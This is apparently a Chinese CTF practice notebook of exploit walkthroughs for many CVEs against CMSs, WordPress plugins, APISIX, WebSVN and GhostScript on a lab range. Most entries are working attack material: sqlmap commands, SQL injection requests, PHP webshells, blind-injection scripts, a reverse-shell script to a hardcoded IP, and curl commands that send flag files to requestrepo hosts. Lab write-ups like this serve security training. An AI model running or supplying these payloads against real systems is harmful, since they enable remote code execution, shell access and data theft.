sqlmap -u "http://eci-2zegbwom8tun99c0wdzl.cloudeci1.ichunqiu.com/admin/bad.php" --cookie="admin=admin; pass=21232f297a57a5a743894a0e4a801fc3;" --method POST --data "action=del&id[0]=0&id[1]=1" -p id[1] --tamper="between.py" --flush-session --current-user --batch
```



## CVE-2019-1010153 zzcms8.3注入

*靶标介绍：*

ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.3中zs/zs.php存在sql注入



## CVE-2018-9309 zzcms8.2注入

*靶标介绍：*

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.2中在dl/dl_sendsms.php存在sql注入漏洞

/uploadimg_form.php?noshuiyin=1&imgid=2

image/jpeg

## CVE-2018-18792 zzcms8.3注入

*靶标介绍：*

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.3中zs/zs_list.php中，Cookie的pxzs参数存在SQL注入漏洞

/uploadimg_form.php?noshuiyin=1&imgid=2

image/jpeg

## CVE-2018-18791 zzcms8.3注入 

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.3中zs/search.php中，Cookie的pxzs参数存在SQL注入漏洞



/zs/search.php

post:

```
Cookie: zzcmscpid=1,1) union%0aselect%0a1,user(),version(;
```

/uploadimg_form.php?noshuiyin=1&imgid=2

image/jpeg

## CVE-2018-18787 zzcms8.3注入

*靶标介绍：*

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.3中zs/zs.php中，Cookie的pxzs参数存在SQL注入漏洞



## CVE-2018-18786 zzcms8.3注入

*靶标介绍：*

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.3中ajax/zs.php中，Cookie的pxzs参数存在SQL注入漏洞

## CVE-2018-18785 zzcms8.3注入

*靶标介绍：*

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.3中zs/search.php中，Cookie的zzcmscpid参数存在SQL注入漏洞

/uploadimg_form.php?noshuiyin=1&imgid=2

image/jpeg

## CVE-2018-18784 zzcms8.3注入

*靶标介绍：*

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.3中admin/tagmanage.php中，tabletag参数存在SQL注入漏洞

*收藏：*未收藏

## CVE-2022-0848 part-db RCE

*靶标介绍：*

part-db RCE

参考链接https://packetstormsecurity.com/files/166217/part-db-0.5.11-Remote-Code-Execution.html但是没有用 

自己准备get_flag.pht

```
GIF89a
<?php
system('cat /flag');
system('cat flag');
system($_REQUEST['cmd']);
system(urldecode("export%20PATH%3D%24PATH%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%3BTAGS%3D%2288f2%22%221648%22%3BTAGE%3D%22f8a%22%22511%22%3Basenc()%7B%20cat%20%22%24%40%22%3B%20%7D%3Basexec()%20%7B%20APWD%3D%22root%22%3B%0A%20%20%20%20if%20%5B%20-z%20%24APWD%20%5D%3B%20then%20MYSQLPWD%3D%22%22%3B%20else%20MYSQLPWD%3D%22-p%24%7BAPWD%7D%22%3B%20fi%3B%0A%20%20%20%20mysql%20--xml%20--raw%20-B%20-hlocalhost%20-uroot%20%24MYSQLPWD%20-Dzzcms%20%3C%3C'EOF'%0ASELECT%20*%20FROM%20%60flag%60%20ORDER%20BY%201%20DESC%20LIMIT%200%2C20%3B%3B%0ASELECT%20ROW_COUNT()%20as%20%22Affected%20Rows%22%3B%0AEOF%0A%20%20%20%20%20%7D%3Becho%20-n%20%22%24TAGS%22%3Basexec%7Casenc%3Becho%20-n%20%22%24TAGE%22%3B"));
phpinfo();
?>
```



```
curl -i -s -X POST -F "logo_file=@get_flag.pht" "http://xxx/show_part_label.php" | grep -o -P '(?<=value="data/media/labels/).*(?=" > <p)'
```

![image-20230718115432281](%E9%9D%B6%E5%9C%BA.assets/image-20230718115432281.png)

## CVE-2021-32682 elFinder RCE

*靶标介绍：*

elFinder 是一个开源的 web 文件管理器，使用 jQuery UI 用 JavaScript 编写。Creation 的灵感来自于 Mac OS X 操作系统中使用的 Finder 程序的简单性和便利性。 其低版本中存在命令注入

![image-20230718154524068](%E9%9D%B6%E5%9C%BA.assets/image-20230718154524068.png)

创建1.txt 1.zip 2.zip

```
GET /php/connector.minimal.php?cmd=archive&name=-TvTT=`echo+"Y2F0IC9mbGFn"|base64+-d`>result%20%23%20a.zip&target=l1_Lw&targets%5B1%5D=l1_Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip HTTP/1.1
Host: xxx.ichunqiu.com
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://eci-2zebhqi3c5qmjvaw71ke.cloudeci1.ichunqiu.com/elfinder.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=d4s5kimi3r6152bj5kokrsu382
Connection: close

```

![image-20230718154627726](%E9%9D%B6%E5%9C%BA.assets/image-20230718154627726.png)

![image-20230718154658438](%E9%9D%B6%E5%9C%BA.assets/image-20230718154658438.png)

## CVE-2022-24263 Hospital Management System sqli

*靶标介绍：*

Hospital Management System sqli

```
POST /func1.php HTTP/1.1
Host: xxx.com
Content-Length: 45
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://xxx.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xxx.com/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username3=admin&password3=admin&docsub1=Login
```



```
sqlmap -r 1.txt  -D ctf -T flag -C flag --dump --batch
```

## CVE-2022-23366 Hospital Management Startup 1.0 sqli

*靶标介绍：*

Hospital Management Startup 1.0 sqli

同上



## CVE-2022-22909 Hotel Druid RCE

*靶标介绍：*

Hotel Druid RCE

前期准备工具
GitHub - 0z09e/CVE-2022-22909: Hotel Druid 3.0.3 Code Injection to Remote Code Execution

靶场地址
http://eci-2ze51ta3xlpb5h4hs28a.cloudeci1.ichunqiu.com

应用程序没有身份验证。运用该–noauth标志不履行身份验证。

 python exploit.py -t http://eci-2ze51ta3xlpb5h4hs28a.cloudeci1.ichunqiu.com/ --noauth  

![image-20230718170550639](%E9%9D%B6%E5%9C%BA.assets/image-20230718170550639.png)

读取flag

http://eci-2ze51ta3xlpb5h4hs28a.cloudeci1.ichunqiu.com/dati/selectappartamenti.php?1=cat%20../../../../../flag

成功获取flag

## CVE-2022-24124 Casdoor api get-oraganizations SQL注入

*靶标介绍：*

Casdoor是开源的一个身份和访问管理 (IAM) / 单点登录 (SSO) 平台，带有支持 OAuth 2.0 / OIDC 和 SAML 身份验证的 Web UI 。 Casdoor 1.13.1 之前存在安全漏洞，该漏洞允许攻击者通过api/get-organizations进行攻击。

```
/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),1)

http://xxx:8000/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=(select 1 from (select count(*), concat((select concat(',',id,flag) from casdoor.flag limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
```

![image-20230719083308249](%E9%9D%B6%E5%9C%BA.assets/image-20230719083308249.png)

## CVE-2022-24112 Apache APISIX batch-requests SSRF RCE 漏洞 春秋云境

*靶标介绍：*

Apache Apisix是美国阿帕奇（Apache）基金会的一个云原生的微服务API网关服务。该软件基于 OpenResty 和 etcd 来实现，具备动态路由和插件热加载，适合微服务体系下的 API 管理。 Apache APISIX中存在远程代码执行漏洞，该漏洞源于产品的batch-requests插件未对用户的批处理请求进行有效限制。攻击者可通过该漏洞绕过Admin API的IP限制，容易导致远程代码执行。

不知爲何poc到我這裏用不了了

```
POST /apisix/batch-requests HTTP/1.1
Host: eci-2ze8wvg9bxev99bkgfp5.cloudeci1.ichunqiu.com:9080
User-Agent: Go-http-client/1.1
Content-Length: 476
Accept-Encoding: gzip, deflate
Connection: close

{"headers":{"Content-Type":"application/json", "X-REAL-IP": "127.0.0.1"}, "timeout": 500, "pipeline":[{"method": "PUT", "path": "/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1", "body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/isok\", \r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute('curl -d @/flag h1mgdmzo.requestrepo.com'); return true end\"}"}]}
```

![image-20230719091916587](%E9%9D%B6%E5%9C%BA.assets/image-20230719091916587.png)

![image-20230719091932930](%E9%9D%B6%E5%9C%BA.assets/image-20230719091932930.png)

![image-20230719092025413](%E9%9D%B6%E5%9C%BA.assets/image-20230719092025413.png)

平台接收到flag



## CVE-2022-22733 Apache ShardingSphere ElasticJob UI 敏感信息泄漏漏洞

*靶标介绍：*

Apache ShardingSphere ElasticJob-UI由于返回 token 中包含了管理员密码，攻击者可利用该漏洞在授权的情况下，构造恶意数据执行权限绕过攻击，最终获取服务器最高权限。

```
curl -d @/flag xxx.requestrepo.com
```

poc.sql

```
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "123";}';CALL EXEC ('bash -c {echo,base64命令}|{base64,-d}|{bash,-i}')

```

/#/login root/root

/data-source

![image-20230719144744886](%E9%9D%B6%E5%9C%BA.assets/image-20230719144744886.png)



```
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://xxx:8000/poc.sql'
```

![image-20230719145151828](%E9%9D%B6%E5%9C%BA.assets/image-20230719145151828.png)

![image-20230719150851265](%E9%9D%B6%E5%9C%BA.assets/image-20230719150851265.png)

## CVE-2021-32305 WebSVN RCE

*靶标介绍：*

WebSVN是一个基于Web的Subversion Repository浏览器，可以查看文件或文件夹的日志，查看文件的变化列表等。其search.php?search= 参数下过滤不严谨导致RCE。

```
import requests
import argparse
from urllib.parse import quote_plus
 
PAYLOAD = "/bin/bash -c 'bash -i >& /dev/tcp/103.231.14.158/7777 0>&1'"
REQUEST_PAYLOAD = '/search.php?search=";{};"'
 
parser = argparse.ArgumentParser(description='Send a payload to a websvn 2.6.0 server.')
parser.add_argument('target', type=str, help="Target URL.")
 
args = parser.parse_args()
 
if args.target.startswith("http://") or args.target.startswith("https://"):
    target = args.target
else:
    print("[!] Target should start with either http:// or https://")
    exit()
 
requests.get(target + REQUEST_PAYLOAD.format(quote_plus(PAYLOAD)))
 
print("[*] Request send. Did you get what you wanted?")
```

## CVE-2021-21315 systeminformation存在命令注入

*靶标介绍：*

systeminformation是一个简单的查询系统和OS信息包

```
/api/osinfo?param[]=$(curl%20-d%20@/flag%20xxx.requestrepo.com)
```

![image-20230719155533236](%E9%9D%B6%E5%9C%BA.assets/image-20230719155533236.png)



## CVE-2020-21650 MyuCMS后台rce

*靶标介绍：*

MyuCMS开源内容管理系统,采用ThinkPHP开发而成的社区商城聚合，插件，模板，轻便快捷容易扩展 其2.2版本中admin.php/config/add方法存在任意命令执行漏洞.

```
/index.php/bbs/index/download?url=../../../../../flag&local=1&name
```

![image-20230719165512785](%E9%9D%B6%E5%9C%BA.assets/image-20230719165512785.png)



## CVE-2020-13933 Shiro < 1.6.0 验证绕过漏洞

*靶标介绍：*

<p>Apahce Shiro 由于处理身份验证请求时出错 存在 权限绕过漏洞，远程攻击者可以发送特制的HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</p>

```
/admin/%3b
```

![image-20230720083253172](%E9%9D%B6%E5%9C%BA.assets/image-20230720083253172.png)

## CVE-2019-16692 phpIPAM 1.4 - SQL Injection

*靶标介绍：*

phpIPAM 1.4后台存在SQL Injection

参考https://packetstormsecurity.com/files/165683/PHPIPAM-1.4.4-SQL-Injection.html

/admin admin/admin888

```
POST /app/admin/routing/edit-bgp-mapping-search.php HTTP/1.1
Host: xxx.com
Content-Length: 190
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://xxx.com
Referer: http://xxx.com/index.php?page=administration&section=sections
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _ga=GA1.2.617032228.1689668529; _ga_J1DQF09WZC=GS1.2.1689668531.1.0.1689668531.0.0.0; phpipam=lv3pkc2n1qmo98cb33cj8jc4h6; table-page-size=50; search_parameters={"addresses":"on","subnets":"on","vlans":"on","vrf":"off","pstn":"off","circuits":"on","customers":"off"}
Connection: close

subnet=1&bgp_id=1
```

把验证信息改成自己的

```
sqlmap -r 1.txt  -D phpipam -T flag -C flag --dump --batch
```

![image-20230720100419448](%E9%9D%B6%E5%9C%BA.assets/image-20230720100419448.png)

## CVE-2019-9042 Sitemagic CMS v4.4 任意文件上传漏洞

*靶标介绍：*

Sitemagic CMS v4.4 index.php?SMExt=SMFiles 存在任意文件上传漏洞，攻击者可上传恶意代码执行系统命令

admin/admin

/index.php?SMExt=SMFiles

直接上传webshell

/files/images/get_flag.phtml

![image-20230720105028002](%E9%9D%B6%E5%9C%BA.assets/image-20230720105028002.png)



## CVE-2018-7448 CMS Made Simple 2.1.6 RCE

*靶标介绍：*

CMS Made Simple 2.1.6版本存在代码注入漏洞，可以通过 timezone 参数执行任意代码

参考链接 https://blog.csdn.net/comingsoooooon/article/details/129948571

一步一步做就行

第四步

```
用burp截获数据包
将timezone的参数UTC改成
junk';echo%20system($_GET['cmd']);$junk='
```

安装完毕访问

/cms/config.php?cmd=cat%20/flag

![image-20230720111022816](%E9%9D%B6%E5%9C%BA.assets/image-20230720111022816.png)



## CVE-2019-13086 CSZ CMS 1.2.2 sql注入漏洞

*靶标介绍：*

CSZ CMS是一套基于PHP的开源内容管理系统（CMS）。 CSZ CMS 1.2.2版本（2019-06-20之前）中的core/MY_Security.php文件存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。

参考 https://github.com/cskaza/cszcms/issues/19

/member/login/check

但是没什么效果 。。。 只能用唯一的poc 把里面的网址改成靶机地址，里面的表和字段改成flag 慢慢等待

https://github.com/lingchuL/CVE_POC_test

```
import requests
import time
import threading
import multiprocessing

pool="abcdefgh1234567890{}-"
mutex=0

#获取长度用的User-Agent模板
ual="'-(if((length((select name from user_admin limit 1))=10),sleep(5),1))-'', '127.0.0.1','time') #"


#"Why don't you just build something"
#----------------------------------------------------获取管理员用户名长度--------------------------------------------
def getlength(field,tbname,total):
    ual_head="'-(if((length((select "     #这些空格一定要保留
    ual_middle=" limit 1))="
    num=1
    ual_last="),sleep(5),1))-'', '127.0.0.1','time') #"

    datas={'email':'111@111.com',
        'password':'111'
    }
    
    header={'Host': 'eci-2ze8rt76cjmpt14gz43t.cloudeci1.ichunqiu.com',
            'Content-Length': '74',
            'Cache-Control': 'max-age=0',
            'Origin': 'http://eci-2ze8rt76cjmpt14gz43t.cloudeci1.ichunqiu.com',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': ual,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Referer': 'http://eci-2ze8rt76cjmpt14gz43t.cloudeci1.ichunqiu.com/member/login',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close'}

    starttime=time.time()
    for num in range(total):
        header['User-Agent']=ual_head+field+" from "+tbname+ual_middle+str(num)+ual_last
        #print(header['User-Agent'])
        sendtime=time.time()
        response=requests.post(r"http://eci-2ze8rt76cjmpt14gz43t.cloudeci1.ichunqiu.com/member/login/check/post",data=datas,headers=header)
        recvtime=time.time()

        doesitwork=recvtime-sendtime
        if(doesitwork>5):
            print("The length is",num)
            print("This step cost:",time.time()-starttime)
            return num
            break
        if(num==total-1):
            return 0

#获取内容用的User-Agent模板
ua="'-(if((ascii(substr((select name from user_admin limit 1), 1, 1))=97),sleep(5),1))-'', '127.0.0.1','time') #"
        
#-----------------------------------------------------获取管理员用户名--------------------------------------------
def getcontent(field,tbname,num,qr,lock):

    #print(num)
    pool="@.tescomadin$ABCDEFGHIJKLMNOPQRSTUVWXYZ"+" "+"bcefghjklpqrstuvwxyz1234567890/."
    
    result=[]
    
    ua_head="'-(if((ascii(substr((select "
    ua_front=" limit 1), "
    ua_middle=", 1))="
    char="A"
    ua_last="),sleep(5),1))-'', '127.0.0.1','time') #"

    datas={'email':'111@111.com',
        'password':'111'
    }
    
    header={'Host': 'eci-2ze8rt76cjmpt14gz43t.cloudeci1.ichunqiu.com',
            'Content-Length': '74',
            'Cache-Control': 'max-age=0',
            'Origin': 'http://eci-2ze8rt76cjmpt14gz43t.cloudeci1.ichunqiu.com',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Referer': 'http://eci-2ze8rt76cjmpt14gz43t.cloudeci1.ichunqiu.com/member/login',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close'}
    
    for i in range(1):
        for char in pool:
            header['User-Agent']=ua_head+field+" from "+tbname+ua_front+str(num+1)+ua_middle+str(ord(char))+ua_last
            #print(header['User-Agent'])
            
            lock.acquire()
            sendtime=time.time()
            response=requests.post(r"http://eci-2ze8rt76cjmpt14gz43t.cloudeci1.ichunqiu.com/member/login/check/post",data=datas,headers=header)
            lock.release()
            
            recvtime=time.time()

            doesitwork=recvtime-sendtime
            if(doesitwork>5):
                #print("It cost:",doesitwork)
                print(num," got:",char)
                #adminnamelist[num]=char    
                result=[num,char]
                qr.put(result)
                break
    
#---------------------------------------------现在！让我们重新揭起救世的大旗！------------------------------------

if __name__=='__main__':

    qr=multiprocessing.Queue()
    lock=multiprocessing.Lock()
    
    field="flag"
    tbname="flag"

    adminname=""
    adminpwd=""

    getresult=[]
    
    #调用获得长度的函数
    length=getlength(field,tbname,100)  
    print("length is",length)

    processes=[]


    #开线程分别对每个字符匹配
    timehead=time.time()

    for ti in range(length):
        processes.append(multiprocessing.Process(target=getcontent,args=(field,tbname,ti,qr,lock)))
        processes[ti].start()

    for ti in range(length):
        processes[ti].join()
        
    fout=open(field+"out.txt","w+")
    for ci in range(length):
        getresult.append(qr.get())
    print(getresult)
    for ci in range(length):
        for result in getresult:
            if(result[0]==ci):
                print(result[1])
                adminname+=result[1]
                
    fout.write(adminname)
    print(field,":",adminname)
    fout.close()
    print("It took:",time.time()-timehead)
```

```
flag{4ec63f5e-4f8d-4ecf-879b-5e2b5e8487bf}
```

## CVE-2018-16509 GhostScript 沙箱绕过（命令执行）漏洞

*靶标介绍：*

GhostScript 的安全沙箱可以被绕过，通过构造恶意的图片内容，将可以造成命令执行、文件读取、文件删除等漏洞。 Python 中处理图片的模块 PIL（Pillow），因为其内部调用了 GhostScript 而受到 CVE-2018-16509的影响

https://github.com/vulhub/vulhub/blob/master/ghostscript/CVE-2018-16509/poc.png 不太行

使用下面的

poc1.jpg

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
 
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%echo 'bash -i >& /dev/tcp/VPS_IP/VPS_PORT 0>&1' >> /tmp/shell.sh) currentdevice putdeviceprops
```

poc2.jpg

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
 
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%chmod +x /tmp/shell.sh) currentdevice putdeviceprops
```

poc3.jpg

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
 
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%/bin/bash /tmp/shell.sh) currentdevice putdeviceprops
```

上传动作要快！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！

![image-20230720203837838](%E9%9D%B6%E5%9C%BA.assets/image-20230720203837838.png)





## CVE-2014-4577 wordpress插件 wp-amasin-the-amazon-affiliate-shop < 0.97 LFI

*靶标介绍：*

wordpress插件 wp-amasin-the-amazon-affiliate-shop < 0.97 存在路径穿越漏洞，使得可以读取任意文件。



```
http://url/wp-content/plugins/wp-amasin-the-amazon-affiliate-shop/reviews.php?url=/flag
```

## CVE-2022-24663 wordpress插件PHP Everywhere RCE 授权

*靶标介绍：*远程代码执行漏洞，任何订阅者都可以利用该漏洞发送带有“短代码”参数设置为 PHP Everywhere 的请求，并在站点上执行任意 PHP 代码。P.S. 存在常见用户名低权限用户弱口令

test/test

login=>wp-admin

![img](%E9%9D%B6%E5%9C%BA.assets/v2-536906340efcbccd0046dfded02e2310_720w.jpg)

![img](%E9%9D%B6%E5%9C%BA.assets/v2-5faa3cac20df24f59abca675532e92fe_720w.jpg)



![img](%E9%9D%B6%E5%9C%BA.assets/v2-e257cd80a32ae9b53b3c61c151c6f0d0_720w.webp)



改成靶场目标

用下面的代码替换

```text
<form action="http://eci-2z9se9cvra1hc6r9iirp.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php" method="post">
      <input name="action" value="parse-media-shortcode" />
      <textarea name="shortcode">[php_everywhere] <?php file_put_contents("/var/www/html/fuck.php",base64_decode("PD9waHAgc3lzdGVtKCRfR0VUWzFdKTsgPz4=")); ?>[/php_everywhere]</textarea>
      <input type="submit" value="Execute" />
</form>
```

![img](%E9%9D%B6%E5%9C%BA.assets/v2-f54aba52bce77c5a5ed1b7a80fdd247f_720w.webp)

![img](%E9%9D%B6%E5%9C%BA.assets/v2-8d1c06b1f489583a8f409a2b2eef4c01_720w.webp)

## CVE-2015-2090 wordpress插件 WordPress Survey & Poll – Quiz, Survey and Poll <= 1.1.7

sqlmap -u "http://eci-2zecjmhdhl21lgmit4xw.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=ajax_survey&sspcmd=save&survey_id=3556498" -p survey_id --dbms=mysql --sql-shell

sql-shell> select flag from flag;
[22:54:26] [INFO] fetching SQL SELECT statement query output: 'select flag from flag'
[22:54:26] [INFO] retrieved: 1
[22:54:27] [INFO] retrieved: flag{769a6588-5e64-43a1-9a7b-13c87ddae290}
select flag from flag: 'flag{769a6588-5e64-43a1-9a7b-13c87ddae290}'
sql-shell> 

## CVE-2022-21661 wordpress < 5.8.3 存在sql注入漏洞

*靶标介绍：*

2022年1月6日，wordpress发布了5.8.3版本，修复了一处核心代码WP_Query的sql注入漏洞。WP_Query是wordpress定义的一个类，允许开发者编写自定义查询和使用不同的参数展示文章，并可以直接查询wordpress数据库，在核心框架和插件以及主题中广泛使用。源码位置：www.tar

/wp-admin

```
wpscan --url http://eci-2zeawo1ts2mztbcjqtpx.cloudeci1.ichunqiu.com/ --enumerate u                       
```

用户名adminadminadmin

```
wpscan --url http://eci-2zeawo1ts2mztbcjqtpx.cloudeci1.ichunqiu.com/ -U adminadminadmin -P /home/kali/Desktop/rockyou.txt
```

/wp-admin/admin-ajax.php

```
action=aa&query_vars[tax_query][1][include_children]=1&query_vars[tax_query][1][terms][1]=1) or updatexml(0x7e,concat(1,user()),0x7e)#&query_vars[tax_query][1][field]=term_taxonomy_id
```

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Upgrade-Insecure_Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.99
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Connection: close 
Content-Type: application/x-www-form-urlencoded

action=<action_name>&nonce=a85a0c3bfa&query_vars={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["<inject>"]}}}
```

```
上面的还是不太行
https://github.com/WellingtonEspindula/SSI-CVE-2022-21661/blob/master/exploit.py
```

flag长度42

漏洞数据包

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: eci-2ze8rt76cjmqb48o5euw.cloudeci1.ichunqiu.com
Upgrade-Insecure_Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.99
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Connection: close 
Content-Type: application/x-www-form-urlencoded
Content-Length: 102

action=test&data={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["1) or (select sleep(5))#"]}}}
```

爆破脚本

```
import requests
import time

def time_delay(url, headers, payload):
    start_time = time.time()
    response = requests.post(url, headers=headers, data=payload)
    end_time = time.time()
    #print(end_time,start_time)
    delay = end_time - start_time
    return delay

def time_based_blind_sql_injection(url, headers):
    result=[]
    for i in range(1, 100):
        for j in range(32,126):#r'0123456789abcdefghijklmnopqrstuvwxyz_-{}':
            #find db
            #payload = """{"id":" (if((substr(database(),%d,1))='%s',sleep(10),1))#"}""" % (i, j)
            #find table
            #payload = """{"id":" (if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%d,sleep(10),1))#"}""" % (i, j)
            #find table -wp%
            #payload = """{"id":" (if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() and table_name not like 0x777025),%d,1))=%d,sleep(10),1))#"}""" % (i, j)
            #find column
            #payload = """{"id":" (if(ascii(substr((select count(column_name) from information_schema.columns where table_name='flag'),%d,1))=%d,sleep(10),1))#"}""" % (i, j)
            #payload = """{"id":" ()#"}""" % (i, j)
            payload = """action=test&data={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["1) or (if(ascii(substr((select database()),%d,1))=%d,sleep(10),1))#"]}}}""" % (i, j)
            payload = """action=test&data={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["1) or (if(ascii(substr((select load_file('/flag')),%d,1))=%d,sleep(4),1))#"]}}}""" % (i, j)
            delay = time_delay(url, headers, payload)
            print('{ ',''.join(result),' } -> @',i,'-',j,"time_delay:",delay)
            if delay > 4:
                result.append(chr(j))
                print(''.join(result))
                break
    else:
        print("The payload is not vulnerable to SQL injection.")
    print('result:',''.join(result))

if __name__ == "__main__":
    url = "http://eci-2ze6nxpzgmh463c3p3ww.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php"
    headers = {
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': '_ga=GA1.2.617032228.1689668529; _ga_J1DQF09WZC=GS1.2.1689668531.1.0.1689668531.0.0.0',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    time_based_blind_sql_injection(url, headers)
```





## CVE-2022-1014 wordpress插件WP Contacts Manager <= 2.2.4 SQLI

*靶标介绍：*

wordpress插件 WP Contacts Manager <= 2.2.4 对用户输入的转义不够充分，导致了SQL注入。

```
漏洞路径/wp-admin/admin-ajax.php?action=WP_Contacts_Manager_call&type=get-contact
